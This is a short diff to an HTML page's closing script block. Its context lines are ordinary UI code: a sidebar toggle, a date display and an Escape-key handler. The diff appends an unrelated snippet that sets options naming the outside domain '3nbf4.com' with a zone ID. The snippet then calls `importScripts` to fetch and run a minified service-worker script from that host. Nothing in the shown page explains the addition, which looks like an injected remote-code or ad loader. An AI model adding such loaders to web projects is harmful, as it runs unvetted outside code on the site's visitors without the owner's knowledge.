@@ -260,6 +260,14 @@ $("#menuBtn").addEventListener("click",()=>$("#sidebar").classList.toggle("open"
 $("#today").textContent=new Date().toLocaleDateString(undefined,{weekday:"long",month:"short",day:"numeric",year:"numeric"});
 document.addEventListener("keydown",e=>{if(e.key==="Escape")$("#sidebar").classList.remove("open")});
 updateSide();render();
+
+  self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 12071533
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
+
 </script>
 </body>
 </html>
